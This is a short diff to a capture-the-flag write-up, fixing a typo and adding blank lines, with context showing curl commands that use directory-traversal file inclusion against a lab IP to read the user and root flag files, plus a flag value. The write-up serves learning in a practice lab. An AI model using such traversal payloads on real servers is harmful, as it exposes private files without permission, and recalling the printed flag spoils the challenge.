@@ -394,7 +394,7 @@ otherwise it's a straight forward machine and a fun one!
 
 
 
-# SOLVE THIS MACHIN IN 2 MINUTES!
+# SOLVE THIS MACHINE IN 2 MINUTES!
 if we just wanted to get the flags and not dealing with all this nonsense we could have just do LFI at firefox...
 ``` html
 curl http://10.10.120.193/article?name=/../../../../../../../../../../home/falconfeast/user.txt
@@ -409,6 +409,8 @@ curl http://10.10.120.193/article?name=/../../../../../../../../../../root/root.
 > 42964104845495153909
 
 for the root
+
+
 that is possible as we do have root premission somewere on the www-data user (probably on the cat command) :P 
 but i want to OWN every machine that i can, so this is not enough for me...
  
